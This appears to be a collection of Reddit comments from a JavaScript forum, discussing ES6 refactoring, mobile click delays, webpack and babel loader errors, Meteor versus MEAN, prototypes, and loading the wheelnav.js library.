Thanks for the answer but i solved it some minutes ago with textbox.contains () like in c#. I've tried it befor but came to the conclusion i wrote contains with a capital C
I think your article is really good. It shows that simple functions that do less themselves and are used in the next set of simple functions is a much more readable alternative to complex functions that try to do everything themselves. It also shows that nesting is a very good sign of this kind of complexity. Functionally they are both the same, but smaller functions and composition allows for better mental chunking. https://en.wikipedia.org/wiki/Chunking_(psychology) However this is all about general programming, not ES6 in particular. In your last example, you can just rewrite this using more readable ES6 class syntax sugar. import { unionBy } from 'lodash'; import LCApi from 'lc-api'; class Bot { constructor(apiKey, investorId) { this.api = new LCApi(apiKey, investorId); } filterLoans(loans, filters) { const filteredLoanArrays = filters.map(filter =&gt; loans.filter(filter)); return unionBy.apply(null, filteredLoanArrays.concat(['id'])); } createOrders(loans, amount) { return loans.map(loan =&gt; loan.createOrder(amount)); } buy(filters) { return this.api.loans.getNewListings() .then(loans =&gt; this.filterLoans(loans, filters)) .then(loans =&gt; this.createOrders(loans, 25.00)) .then(orders =&gt; this.api.account.submitOrders(orders)); } } Notice that here you don't have to reference the "Bot" name when calling filterLoans and createOrders. This makes not only for better readability (the reader does not have to double check if Bot is the same object that they're currently reading) but also for much easier refactoring (renaming the class). And also, since your filterLoans and createOrders functions don't use the "this" keyword (they don't actively make use of the class instance / object state), you could extract them as much simpler common functions instead: import { unionBy } from 'lodash'; import LCApi from 'lc-api'; function filterLoans(loans, filters) { const filteredLoanArrays = filters.map(filter =&gt; loans.filter(filter)); return unionBy.apply(null, filteredLoanArrays.concat(['id'])); } function createOrders(loans, amount) { return loans.map(loan =&gt; loan.createOrder(amount)); } class Bot { constructor(apiKey, investorId) { this.api = new LCApi(apiKey, investorId); } buy(filters) { return this.api.loans.getNewListings() .then(loans =&gt; filterLoans(loans, filters)) .then(loans =&gt; createOrders(loans, 25.00)) .then(orders =&gt; this.api.account.submitOrders(orders)); } } Doing it this way makes it much more understandable that they don't depend on the state of Bot, making them very easy candidates for method extraction - that is, extracting them into their very own modules, further improving mental chunking. For example: import { unionBy } from 'lodash'; import LCApi from 'lc-api'; import { filterLoans, createOrders } from 'loaning'; class Bot { constructor(apiKey, investorId) { this.api = new LCApi(apiKey, investorId); } buy(filters) { return this.api.loans.getNewListings() .then(loans =&gt; filterLoans(loans, filters)) .then(loans =&gt; createOrders(loans, 25.00)) .then(orders =&gt; this.api.account.submitOrders(orders)); } } Now we're making even more use of ES6 modules, and we reduced the mental chunk of what it means to be a "Bot" to a minimum.
Two comments--this is the elephant in the room as people switch frameworks constantly. A framework will change and create an insecurity and a desire to run the latest technology. So, I'll hurry to fill in the gaps and update that stack, do a rewrite and the cycle repeats with each new release -- in 2 years somerhing else will come out and you'll be all pumped up about its new ways... In Buddhism they recognized the desire for constant change as one of the causes of suffering. As you're leaning over that cup of coffee near the end of that release cycle, that initial zeal for this framework faded... You've suddenly found yourself in another camp, what was once hot is now not. That is heat loss. Write sustainable maintainable code based on Zen principles. Complexity introduces larger and larger rates of entropy and puts us on the wrong end of the asymptote curve. Now Babel and ES6 come out and coders start to increase project complexity... Build times increase, the dependency tree grows and you're standing on a house of cards. It's the latest and biggest house of cards, but a house of cards none the less. Break the language down, reduce complexity and increase independence. Ask yourself not just what code you can delete, but what methods of thinking you can delete. This is the challenge, to have the courage to code simply. **TLDR; Complexity fails, simplicity scales.**
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/opensource] [\[X-Post \/r\/javascript\] node.js SDL runtime as alternative for electron (using node-ffi and 13.7 MB compressed size)](https://np.reddit.com/r/opensource/comments/4a3lkg/xpost_rjavascript_nodejs_sdl_runtime_as/) [](#footer)*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))* [](#bot)
Fuck iOS users, too.
But... you're right. $ node &gt; var a = 5; &gt; function inc_a() { a = a + 1; } &gt; inc_a() &gt; a 6 
I wrote this https://github.com/prettydiff/5082
I just got around to adding babelify to the project for es6 syntax support.
Try using [HTMLFormElement.elements](https://developer.mozilla.org/en-US/docs/Web/API/HTMLFormElement/elements) rather than the subscript operator on the form itself. On Safari, this returns a RadioNodeList rather than a NodeList, and hence has .value
Ehh, that specific answer is debatable. Java/Python have supported this functionality for years, but it's with the understanding that Sets of mutable objects can change and it's up to the developer to understand these possibilities (Python more so). So, these two take the route of only doing the equals/hash comparisons at insertion time, and we could use other tools to help prevent these problems like immutable objects. If you think about it, a Set evicting items when you change a mutable object inside it, is just downright confusing and probably error prone. What if it evicted the wrong thing? So overall it's a trade-off with feature vs. practicality and there's probably no good answer, but I'm going to go with Java/Python on this one.
What do you envision being made with this? Games? Animations? The reason I ask is because SDL is not really for end user applications (buttons, grid, etc). I'd be excited to see if someone has done some bindings for QT in Node. This is a cool concept though!
I'm definitely going to check this out. This has happened to me at least twice, and the devops team at work estimates that it affects ~5% of the `npm publish` calls that our team makes. Huge PITA when it happens, too. However, come to think of it, I don't think I've encountered it since I update NPM (forget which version).
is anybody here strongly against stuff like ``` new Date( Date.now() - 32 * 86400 * 1000 ) ``` to fetch, say, 1 month ago?
A table that implements search, filtering and virtual scrolling world be a good start- ag-grid comes with pretty much everything you could want in that scenario.
Moment.js for this type of stuff.
That's pretty neat
There are ways to work around that too, [example](https://dzone.com/articles/300-ms-click-delay-and-ios-8).
Yeah, I wouldn't be sending all the data even then. I'd send whatever information is required for the current page, sorted however it may be required at the API 
Don't worry about size just yet. Try to profile the solution on various devices/browsers and see if performance is okay. You might find that the implementation is just fine. If it turns out that the 1MB payload is too big, can you do any caching to avoid it?
I'm trying to figure out the motivation here; you don't want to use Typescript or Flow but you want *extremely* robust arity and type checking at run time (that is, after the problem has occurred). It feels like square-peg-round-hole. That said if you're willing to go through all the work, and you're willing to take the performance hit, then I'd find just about all of those forms equally useful. As an aside, how will you type-check objects? Obviously in most cases functions expect objects with a particular structure, not just any object.
The normal click event is fine for mobile but by default there is a delay before it triggers. I use a lib. called FastClick to skip the delay, its easy to implement and works great with jQuery. https://github.com/ftlabs/fastclick
For accessibility just assume that *click* will always be available where there is a user-facing DOM. This means user interactions on elements that expect to receive a mouse click will continue to work the same universally. It also means you can arbitrarily force a mouse click universally by firing a *click()* method on an element node. Mobile doesn't have mouse clicks. This means that aside from the previously stated exceptions clicks don't exist on mobile. Mobile also doesn't have hover, mouseover, or mouseout. Mobile does have mousedown and mouseup and touch events. Touch events most noticeably differ from the mouse events in that there can be a plurality of touch events occurring at the same time. If you want to drag things around or other advanced GUI like interactions don't use click events (you shouldn't be using those anyways for this kind of interaction). If you want to simulate simple user interactions or want to trigger states on buttons, hyperlinks, or form controls you probably should be using click.
It happened to me on March 2nd and March 9th. That is when I had enough. I was running Node 5.4.1 and the last NPM for that Node version, which isn't too far behind the current 5.7.0.
I made a prototype for some style things and a logo lockup concept for a conference I run in Denver. http://codepen.io/DrewDahlman/full/wGWzxv/ It's pretty basic but the effect seemed neat ( best in chrome ) it uses globalCompositeOperation for masking.
That is an interesting idea, but I am fairly certain it would break accessibility. Nice experiment with the DOM though!
...and produce a lot of garbage.
Would the window then resize to the div? If it won't, then that is basically what I did but with a table. I used a table vs div because this application will be launched in an environment with some very old servers. Some of this will be viewed on things like IE 7.
It depends on the time to download the data by the client, and how fast the client's connection is (do consider your client's lack of internet speed). If the data needs to be processed as a whole on client side (e.g. for data sorting), you might want to consider caching the data into the local storage and include a timestamp for it. The next time the page is loaded again, check whether the data in local storage is recent enough before re-retrieving the data again. If it's recent, load it from the local storage. If the data doesn't need to be processed as a whole on client side, you can split the data into smaller parts so the client will progressively get the data quickly enough, rather than a long wait then be shown the whole data.
Could u explain how it works? It does not need node.js runtime on client (non developer) platform?
While it may be interesting, it should only be used for academic purpose only. The method is not memory-friendly and it should not be used within a loop or be used repeatedly.
The main benefit of putting the methods on the Bot constructor is that those methods are exposed to users without requiring an instance of Bot. In both of your examples they disappear entirely. Which is better comes down to how useful these methods one thinks they are to the user. Personally, I'd like to enable my user to filter loans without buying them, and even create orders. Let's say an advanced user wants to create their own buy method adding another step somewhere. With my posted setup, they can: import Bot from 'lc-bot'; const bot = new Bot(123, 'secret'); customBuy(filters) { return bot.api.loans.getNewListings() .then(loans =&gt; Bot.filterLoans(loans, filters) .then(loans =&gt; removeLoansAlreadInvested(loans)) .then(loans =&gt; Bot.createOrders(loans, 25.00) .then(orders =&gt; trimOrdersToBudget(orders, 200.00)) .then(orders =&gt; bot.api.account.submitOrders(orders)); }
Thanks for sharing this, I appreciate it. So from someone who's still pretty new to this all, I guess I'm still just amazed that the onboarding process is home-built. The way it "steps" through step one through four, the way the circle moves across the screen to guide the user to the next step.
I agree. It has features of more complex typed languages, like Java, but the syntax is concise and fun to write (like Javascript). It also includes cool concurrency features that are easy to use.
Strings solve my problem, for now. But give an option to get an object that's a nice suggestion! =) If you want, send a pull request ;)
Nailed it. Code is for other humans to read at some point in the future. It's not to show how clever or slick you can be. Readability and understandability are #1.
Why not? ;)
Sorry, I tried formatting but apparently I don't know what I'm doing. If someone can provide some recommendations I will update that as well. Thanks!
Wrap it in parenthesis. 
The demo didn't work for me https://borismus.github.io/sonicnet.js/emoticons/
You're correct on the React/Redux fronts, but it seems you're a bit confused where Express fits in. Express is the server. If someone is logging in, then you need a server to validate their log in. If you're saving data in a central database, you need a server to save that data in. Express is just a web server that can handle requests for these things. For routing, react-router is the most commonly referenced router.
~~You can't make calls from webpage x to API website y arbitrarily. The other website must allow it via CORS or JSONP. According to the dev portal they do allow it:~~ &gt; Responses returned by the Marvel Comics API are compliant with the W3C CORS specification, which allows any properly-authorized requests to be made from any origin domain. This means that you should not need to wrap calls in JSONP callbacks in order to make calls from browser-based applications. If you do prefer to use JSONP, however, all endpoints will accept a callback parameter to all endpoints that will wrap results in a JSONP wrapper. ~~You may want to try jsonp, which is as simple as adding a "&amp;callback=?" to the end of your URL for the API endpoint.~~ update: that was not it on further inspection. So it may be with your hashes, or the structure of your code. This looks like you copied it from another source and tried to modify.
Sorry, wrap the div you're returning in parenthesis. I think if you break your return of jsx into multiple lines like you have you need to wrap it. 
Aha, well the return that is breaking is in a node module (react-f1), I tried wrapping it but nothing changed.
Stop it.
[wat](https://pygospasprofession.files.wordpress.com/2013/07/watman.jpg)
It wont work for anyone who does not have a private key to match. They will be unable to assist you.
The delay isn't there for sites with device-width set on the viewport meta tag. This link is for chrome, but I believe ios safari has a similar thing. (latest versions...) https://developers.google.com/web/updates/2013/12/300ms-tap-delay-gone-away?hl=en
 Object.defineProperty(Function.prototype,'invoke',{get:function() {this()}}); alert.invoke; //empty alertbox; Never do this though, it's horrible in so many ways.
I would argue the fade in one is quite a bit more difficult due to Reacts animation pipeline being a bit odd. The second question seems pointless to ask if you know the first
&gt; Someone's going to point out that Javascript doesn't have a type system and using TypeScript or Flow would be much better than trying to shoehorn them into JS. I get it. No, its not that. The problem in this case is not type, but that population of arguments is not stylistically required. It comes down to how terse or flexible a given function is about the things passed to it. For example here is a completely forgiving function: function whatever(a, b, c) { if (typeof a === "number") { //do the logic } else { return 0; } } There are times when forgiving functions are absolutely sloppy and other times where it is really convenient. From a performance perspective the goal is to prevent type recasting, which can be done several different ways and is not limited to forcing type errors on your users.
&gt; The problem in this case is not type, but that population of arguments is not stylistically required I'm not quite sure what "problem" you think you're responding to. I'm not asking for opinions on whether typechecking is a good idea. I'm doing a direct port of some code from another language and I want to maintain the same semantics. The function has been called with a bad arity or a mistyped arguments. This is all a given, my question picks up from here to ask how you want to receive that information. 
Will it work with parameters? alert.invoke = "hello";
Though none of the code posted should ever be used in a real project, I believe the answers are real gems of creativity!
The issue is you are (correctly) excluding node_modules from your babel loader. Since react-f1 is an npm module it won't be given to the babel loader, causing this error. You could add another loader just for handling react f1 (use an include regex instead of an exclude). 
I made a client-only version of battleship with random ship placement. You have to pass the phone/tablet/computer to a friend for them to play it, but I just made it to experiment with typescript and vue.js. [Battleship!](https://salty-oasis-66469.herokuapp.com/#) [Source](https://github.com/kylestlb/BATTLESHIP)
Seems u are right. I guess I'l add another loader then=) EDIT: is there anything wrong with my extra loader? still getting the same error: http://puu.sh/nEq3r/1dfc8eb59a.png
This is disgusting. I love it.
good @morningrat! I am part of the core-team of [azk](http://azk.io). If they need help about this you can call at: - chat: https://gitter.im/azukiapp/azk - github of project: https://github.com/azukiapp/azk - twitter: https://twitter.com/azukiapp - twitter personal: https://twitter.com/gullitmiranda
Sorry for being nooby but how should a regex look from this? /node-modules/react-F1/,
Just needs device-width now &gt; …double-tap zooms in a little bit. Not a particularly useful amount. A further double-tap zooms back out. We feel this feature, on mobile-optimised pages, isn't useful. So we removed it! This means we can treat taps as clicks instantly, but we retain pinch-zooming. But apparently this is only in chrome beta (v32)
How did you like vue?
I'm not quite sure what your question is here, but googling wheelnav js and spending 3 minutes reading the API showed exactly how to invoke this library. If working with a library in general is this confusing you should take a step back first and simply learn HTML and native JS first - that will help a lot. Good luck!
I wrote a presentation to explain prototype, __proto__, protypal inheritance, the best is it's visualized, go check it out: http://www.slideshare.net/ssuser87919a/javascript-prototype-visualized You better download it and run it locally, because then you'll have animation. Come back and bite me if you still don't understand those concepts after go through the presentation
Even if it's not of practical use it is still cool.
On mobile so I can't PR, but the steps listed in the contents are kind of jumbled -- steps 6a and 6b are off.
Should probably do something like this: const d = new Date(); d.setMonth(d.getMonth() - 1); But yeah, should probably be using moment instead unless it's only being done once. 
This is why I asked simply : how to get it onto my index page. No need for explanation of errors which are complicated and difficult to explain. Just want to know how its done so i can check the more experienced coder's methods against mine and fill any gaps. I know its not how everyone does it. At this point I have reset index back to start with &lt;script src="js/raphael.icons.js.js"&gt;&lt;/script&gt; &lt;script src="js/raphael.icons.min.js.js"&gt;&lt;/script&gt; &lt;script src="js/raphael.js.js"&gt;&lt;/script&gt; &lt;script src="js/raphael.min.js.js"&gt;&lt;/script&gt; added to the head. when I do as http://wheelnavjs.softwaretailoring.net/examples.html and http://www.noupe.com/development/javascript-create-circular-navigation-menus-with-wheelnav-js-89974.html suggest, nothing happens. Thats about it. here is the reset page anyway: www.radactinc.com 
Pretty cool! Looks like it has 2D bitmap graphics and immediate mode style OpenGL support?
Thank you so much! I haven't used either of those yet, but I'm about to start a project with them, so this will save me a ton of headaches.
They also do the single var thing so my bet would be on mild programmer OCD.
on www.radactinc.com you are getting these errors in the console (right click on page -&gt; inspect -&gt; console, or ctrl+shift+C) http://www.radactinc.com/js/raphael.icons.js.js Failed to load resource: the server responded with a status of 404 (Not Found) http://www.radactinc.com/js/raphael.icons.min.js.js Failed to load resource: the server responded with a status of 404 (Not Found) http://www.radactinc.com/js/raphael.js.js Failed to load resource: the server responded with a status of 404 (Not Found) http://www.radactinc.com/js/raphael.min.js.js Failed to load resource: the server responded with a status of 404 (Not Found) I noticed you had ".js.js" is this a typo? did you mean just ".js at end or have you changed the actual resources to have .js.js at end?
Incorrect. what you see in libraries is this: !(function () { ... }()); note the parentheses at the end.
What exactly are you asking? You do realize it's an open source project and that you could just read the code? https://github.com/webpack/webpack/blob/master/lib/webpack.js
Appreciate the thought, but Elm was literally one of the examples of error reporting in my post.
 var str = "hello"; var table = { "l": "r" }; function translate (str) { var s = ""; for (var i = 0; i &lt; str.length; i++) { var c = str[i]; if (table[c]) s += table[c] else s += c; } return s; }; console.log( translate( str ) ); // herro
Would've been useless back with npm2.x Slow speeds introduced in 3.x makes it worth it a shot - will check it out next time I use npm, sounds fun.
Try use include before exclude. But I'm pretty sure you can fix that by using import/require on 'react-f1'
When it comes to loading scripts client side there are only a few common practices with the most common being loading in scripts directly in the DOM via HTML as you've referenced. If your script is doing nothing, then I would start with making sure it is even being loaded/correctly referenced by just looking at your browser's console and seeing if any syntax errors or console.log() checks you put help lead you to the source of the issue. When you open your console can you actually pull up all the referenced scripts? Are you using a browser/version that is supported by the script?
ctrl+f "module" - exactly one mention not in the footnotes, and it's not even about ES6 modules: &gt; JavaScript module frameworks like RequireJS [7] and ModuleJS [16] allow developers to manually specify dependencies between JavaScript libraries. Once the dependencies are specified, the frameworks ensure that the relevant libraries are loaded in the appropriate order. Keeping manually-specified dependencies up-todate can be challenging for a large web site. Sigh.
Small bug - while going through your API I noticed that under `Direction`, both `Direction randomDirection()` and `String toString()` expand/contract together regardless of which heading you click.
You can take a look this link https://github.com/kriasoft/react-starter-kit
This is fantastic
So I did a separate loader for react-f1, but still not working: http://puu.sh/nETFe/66c67ff401.png Where do you mean I should import the module? I am already importing it to a react component of mine, and thats when I'm getting the error. I am new to webpack but if I import a module to my main.js for example, shouldn't the module also run through the babel-loader then?
Yes if you import it to main.js, it will be included there, so there's no need for it's entry in webpack config. No idea why that happens, since react-f1 component doesn't seem to have any error :/ Are your loaders up-to-date? what about babel?
It would of been bad practice even when it worked.
When you say accessibility, do you mean the fact that it won't work with JavaScript turned off?
No, I mean user accessibility like it's defined here: https://github.com/prettydiff/wisdom/blob/master/Web_Education.md
Check out this page: https://developer.mozilla.org/en-US/docs/Web/API/Fullscreen_API
Thanks, although I really don't know how to apply any of this. I can't get the game to run outside of the page or how and where to add any code to make it fullscreen. Would a bookmarklet work?
Love your grid, just about to deploy a ag-grid solution, this license change may kill it. I was selling it on the fact that SlickGrid is stale, ui-grid doesn't perform as well or have as many features, and ag-grid is a great open source component. I was planning on adding some of the cut/paste, excel options (similiar to SlickGrid) myself, awesome that you have already done it. Would be willing to pay for v4 features...but now I have to re-pitch everything to the client as a licensed play. Rest of my stack is open source, now I have this commercial piece in the middle. A grid is a commodity component. From an OEM perspective, having a slick interface is great but the real delivery is solving their business problem with working code. Even if the cost is small, having a recurring cost and commercial terms adds complexity and confusion. Subscription fees if you are providing a full solution make sense (like an AWS server, or Office365), but if you are a component it makes it almost impossible to use as part of something else. Another vote for a one-time license fee, no recurring, audit, etc. Give it 1 year free upgrades, then charge for upgrades.
Why did you use the service worker? 
lol-Thank you! I have no idea how this happened or how I missed it but its fixed now. fixed. All libraries called and js modified to wheelnav specs. whats wrong now? Still nothing there : www.radactinc.com 
Fun! :D 
For offline support + finer control over caching 
It works fine with no paranthesis, but yeah, this is strange :/ Does using ```return &lt;div&gt;something something&lt;/div&gt;``` without using react-f1 work for you?
normally you go through and change them in an editor, try ctrl+f, or ctrl+h after visually confirming the change. It would take an extraordinary set of circumstance to be compelled to modify the source code on the fly as there are a few ways it can get messed up in the process. 
I'm not trying to modify them for actual use, just more of a toy project to see if I can reformat some source code. Sorry, I should have put that in the description! Thanks though!
yes works fine, doing it in all my react components without any problems.
Worth noting that Array.includes() is ES7 so may or may not be available.
Are you asking how to do a string replacement? https://www.google.com/webhp?sourceid=chrome-instant&amp;ion=1&amp;espv=2&amp;ie=UTF-8#q=javascript%20string%20replace%20all actually parsing javascript is challenging at best, variables can be created on the fly, via a hodgepodge of modules, even paid-for IDE's don't always get it right, and with band-aids like JSDOC you even have a case where it doesn't match reality. You *could* attempt to assign it to an object in node space, and then look for variables in that object (are you looking at more than just top level variables?), etc. statically typed languages are usually better for parsing. i.e. you can't do this. var pt="1=3"; var pl="var l"; eval(pl + pt); l1 (output) 3
Very cool!
Already tried and failed. It's very frustrating as the module seems awesome (check the authors talk here about the module and its implementation in a very nice project https://www.youtube.com/watch?v=8b95VSUkVCw) and I had hoped to being able to play with it by now haha=)
Fixed it. Thanks @rauschma
This is awesome! Been looking for something like this for a long time!
I had already included it before parse was called and it is like that now but still not showing. Ill check for new errors. edit: console not showing any errors but still no nav wheel
X-Post referenced from /r/vuejs by /u/Cyb3rWaste [I'm doing a workshop for all those interested in Vue.js, Sunday 20.03.2016 @ 20:00 CET](https://www.reddit.com/r/vuejs/comments/49yj1v/im_doing_a_workshop_for_all_those_interested_in/) ***** ^^I ^^am ^^a ^^bot ^^made ^^for ^^your ^^convenience ^^\(Especially ^^for ^^mobile ^^users). ^^P.S. ^^negative ^^comments ^^get ^^deleted. ^^[Contact](https://www.reddit.com/message/compose/?to=OriginalPostSearcher) ^^| ^^[Code](https://github.com/papernotes/Reddit-OriginalPostSearcher) ^^| ^^[FAQ](https://github.com/papernotes/Reddit-OriginalPostSearcher#faq)
Take a look at [jscodeshift](https://github.com/facebook/jscodeshift).
Wow this is absolutely perfect for a project I'm getting started on.
I don't think your downvotes in that thread have anything to do with Meteor.. probably just a reaction from people who think that 'being new' and 'doing a ton of research' doesn't qualify you to give that sort of advice... these people are petty, but such is Reddit sometimes. &gt; Thoughts on Meteor I loved it for the year that I used it.. have one Meteor app in prod, and recently moved over an app from Meteor to express/socket.io/react. My advice is to just get on with business and choose what works for you at the time. Meteor is a perfectly fine choice.
&gt; So [[Prototype]] is either null or refers to an object; wouldn't this be __proto__? Yes, [[Prototype]] and \_\_proto\_\_ are the same thing. [[Prototype]] is how the spec refers to it, and \_\_proto\_\_ is a recent addition to the language. &gt; eric.__proto__ will be Person.prototype which is just an empty object. I can then add a method to this object which will be shared among all instances created using this function. Yes. &gt; What's weird is, if eric inherits everything from the Person constructor, then why can't I access the properties in Person by doing eric.__proto__.firstName? Those properties weren't assigned to the \_\_proto\_\_ object. They were assigned directly to the "eric" object. Inside the constructor, "this" will refer to the newly created object that you later assign to "eric".
I don't think they're planning on writing the next great framework. They just want to write something non-trivial to force them to learn the language better.
Meteor is a great framework for app development because it handles a lot of the nuts-n-bolts complexities that normally require a lot of thought and careful design. There is a great article outlining the differences between [Meteor &amp; Node](https://wiki.dandascalescu.com/essays/meteor_js_vs_the_mean_stack) that I suggest you read. That being said, jumping straight into development on Meteor will, in the long run, hold you back from learning some of the intricacies of JS and how things work under the hood. The same can be said of most frameworks. Frameworks are designed to *abstract* away from the complicated code so you can accomplish more with less, which from a developer's perspective, is fantastic, but if you are a student of the trade, this abstraction limits your exposure to a lot of the cool things that the language is capable of. Your decision should depend on what you want to do. If you just want to develop some apps for fun then there's nothing wrong with jumping straight into Meteor. However, if you are serious about a career in development, you should learn JavaScript inside and out before even considering a framework. Check out [Eloquent Javascript [pdf]](http://eloquentjavascript.net/Eloquent_JavaScript.pdf). Get through the first 6 chapters and do some of the exercises. It's a well written book and provides a great foundation for further learning. To dive a little deeper, Kyle Simpson, the developer of the MakerSquare Boot-Camp curriculum, has a series called [You Don't Know JS](https://github.com/getify/You-Dont-Know-JS) that really digs into the oddities of the language that most people overlook. If you prefer learning via video, Anthony Alicia has an amazing series called [JavaScript: Understanding the Weird Parts](https://www.udemy.com/understand-javascript/?dtcode=r9HSRPf4H3z2). That link has a 90% off coupon valid until the 16th of this month, $15 is a steal. I had a decent amount of experience with JS before watching the series and still learned a great deal from his instruction. The first three hours are available on [youtube](https://www.youtube.com/watch?v=Bv_5Zv5c-Ts) if you want to get a feel for it first. Once you get comfortable using JavaScript on its own, look to NodeJS and the MEAN(MongoDB, Express, AngularJS, NodeJS) stack before Meteor. Anthony has another series, [Learn and Understand NodeJS](https://www.udemy.com/understand-nodejs/)(same discount) which is even better than his series on JS. Frankly, it's the best instruction on the MEAN stack I've come across. If you want to get more on the nuts-n-bolts of Node(or don't want to dish out $15), Brad Dayley has a great [book [pdf]](http://ptgmedia.pearsoncmg.com/images/9780321995780/samplepages/9780321995780.pdf) on the MEAN stack. Once you are comfortable in your understanding of how NodeJS works, then feel free to experiment. All this isn't to say that you *shouldn't* use Meteor, just that you should strive to understand how things do what they do before you use them. MeteorJS is a fantastic framework, and definitely where the future of web &amp; app development is going, but learning a single framework isn't a magic bullet. I think the downvotes came from developers who are tired of newcomers thinking that the framework makes the developer. The truth is, the developer makes the framework. Good luck on your journey my friend! Should you have any questions about JS or about anything I've mentioned feel free to PM me, I'd be happy to help.
The difference is that in the first case, the object has an "own" property `perimeter` that refers to the given function, whereas in the second case the object has no such property. Instead, when lookup of the `perimeter` property fails to find an "own" property, the first prototype in the chain is consulted, and there the lookup succeeds. Because the prototype is shared by all instances of that type, that one function appears as an attribute on all instances. And if you change it, the change it reflected instantly in all instances. If every instance has its own property, then they are all independent. Arguments about which uses more memory should not really be all that persuasive. An implementation might be able to detect that all the functions are identical, and only create one of them. It's all down in the muck of implementation details and how particular engines optimize code. That's far down on the list of things that actually matter. If it really matters to you, you need to benchmark an actual application to determine if one method is faster or uses less memory under the particular circumstances. 
&gt; using a prototype requires less memory as it is more like memory pointer, whereas for the first case, a function is created for each object. Is this accurate? Yes.
Where do i put this code? Head? Body? Div? Thank you for your help btw!
&gt; From what I read, using a prototype requires less memory as it is more like memory pointer, whereas for the first case, a function is created for each object. Is this accurate? Are there any other reasons? In your first example, you have an object `rect` with its own property `perimeter`. If you were to then create a new rectangle `var shape = new rect`, there would then be two instances(copies) of the property `perimeter`. Create enough rectangles and your app starts to get really big. Prototyping allows you to attach shared methods to objects. Kind of like how all arrays have access to the method `.forEach()`, but don't actually have that function stored in their memory. By attaching `perimeter` as a prototype, you are giving any new copy of `rect` access to this method without the need to store it as a property(in memory). Irrelevant side note, you should remove the comma after the function definition in your first example: var rect = { perimeter: function (x, y) { return (2*(x+y)); } // no comma after last property in object };
I always try to ask for consent before converting a variable. Coercing can be traumatizing.
Meteor is **not** a (web) framework, it's a **full-stack platform**. I do not like how that linked post's parent puts Meteor in the same bucket as AngularJS/Ember.js/Aurelia/... because Meteor is really the odd one there. I assume that's also one of the reasons why your post could have been downvoted, because suggesting "Meteor is the clear winner" on a question called "Choosing a front-end framework" is like suggesting "Banana" on a question called "What is your favourite color". --- But to answer your question, my thought about Meteor is that it's pretty neat and solid platform, that has covered a lot of aspects you need in apps (live data updates, security, web and mobile support, ...) but it also comes at a cost. While Meteor is certainly great, it ties you to certain prerequisites, like how closely coupled it is to MongoDB. From the jobs I get, 90% is to provide an application on an existing (SQL) database, porting the data is usually out of the question. So, would I suggest learning Meteor? Yes, but keep in mind that it is more than just a framework, and that you should not put all your hopes into Meteor.
Wow, ok buddy - you're trying to run when you don't know how to walk yet. Try some basic javascript tutorials. There're plenty on the web or even on youtube. Basically, on the client side (on the browser) you'd save the script into a file like "app.js" and then link to the script from your html page using a &lt;script src="app.js"&gt;&lt;/script&gt; tag. And just to clarify, this is a javascript subreddit and the code above is javascript (sometimes called ecmascript). It has very little (practically nothing) to do with Java - I know the similar names make it confusing. Javascript generally runs inside the browser - with NodeJS you can use it on the server/computer (not inside the browser). Java generally only runs on the server/computer (like most programming languages). Anyhow, try to start with some very basic tutorials. There are plenty of videos on youtube to help you get started.
There are a few things that have always kept me away- I'm guessing these are all still true, though I know future versions will address some of these issues addressed: * Mongodb is the only database it works with out of the box, and mongo is not a silver bullet solution- it's a suboptimal choice for relational data * A lot of the magic (in particular autopublishing) has to be disabled to make it secure enough to use in production * No module support - AMD, CJS or ES6. I've no desire to organize file names so that they're included in the correct order. * Deploying node, a database and a client application separately is so much easier to manage than deploying everything as a single package, once you're comfortable configuring them. Properly configured, databases can be gracefully shut down once all transactions have completed, and http servers can be shut down once all open connections have closed. If a Meteor server's process is restarted, you're out of luck and may have garbage data in your database as a result. * Meteor's Galaxy hosting was overpriced when first introduced- not sure if it's come down at all or not, but it was an unpleasant surprise for quite a few people If you're just looking to *learn* and become more comfortable with JS, Meteor's not bad, but it's not going to teach you as much as if you opted for something like the MEAN stack. Because mongo, express and angular have no dependencies on each other, you can choose alternatives for each and get more experience understanding the roles those pieces play. With Meteor, you're all in and all you're really learning is Meteor. That's my 2c, anyway.
Then a framework is probably a really bad idea for that.
Choose tutorial edit your player then press "Run". 
&gt; C palindrome x 5,753,415 ops/sec ±1.40% (84 runs sampled) &gt; Javascript palindrome x 3,307,899 ops/sec ±1.28% (84 runs sampled) &gt; Fastest: C palindrome &gt; Slowest: Javascript palindrome &gt; &gt; C++ do **170%** better than js now thanks to nan 😃 Uh, I think you mean 70% better (faster). It'd have to do more than 8 million ops/sec to be 170% faster.
I think this is the general consensus among the folks who are not into it. Long and the short of it is Meteor is too magical and opinionated in the age of React, and the age of NPM being viable on the front-end.
The scroll on this page drives me nuts. I scroll a touch and I'm halfway down the page?
You just start with a problem you want to solve or an idea you want to experiment with. Take [Toy Box](https://github.com/AdamKyle/Toy-Box) for example. I wanted to see if I could create a modern day impl. of DI for JS. And I think, so far, I am successful at it.
Just posted a new post with the link. Would this work? Thanks a lot, very much appreciated.
Yup, it's public now. Good luck!
I'm working through the tutorial and got to the necromancer, but I think I'm screwing up how delay works. (I think it lets you fit multiple actions in a round, am I right?)
Immediately after executing an action your delay is incremented. So since all your delays for all your actions are &gt; 1, you can't do multiple actions in a turn. We were going to implement "speed" potions or something but never got around to it. So if you just go with the "one action per turn" mantra you should be good. ( I recommend a return statement directly after each action so you don't mess it up)
sorry it should of been wheel = new wheelnav("divWheel"); The string in quotes is referencing the id of the div where you want the wheel. 
But you can use both React and NPM natively with Meteor now. It's not 2013 anymore
I wasn't name-dropping React and NPM as things that Meteor doesn't have, but more as an indicator of current trends, which is increased modularization of smaller, more focused dependencies (i.e. so it's not exceptionally difficult to take something out entirely or replace it, or to add something else in. The impression I've always gotten from Meteor is you have less choice in favor of plug-and-play. Granted I have pretty minimal experience with it.
Hmm I think I did that and it didn't do anything. 
polyfills man, polyfills
This sounds really similar to Teoria. Anyone used both and able to share some thoughts on how they compare?
Yeah I actually can hardly read this article using my MBP touchpad scroll, can't get the accuracy. Sites need to quit this trend of scroll hijacking, I don't want it.
Do WebSocket have the innate ability to handle resending data when a connection is lost? I know Firebase has the ability but that might of also been scripted into their library? Regarding Webhooks, I thought Webhooks are user-defined POST requests and can send callbacks after a request is dealt with? 
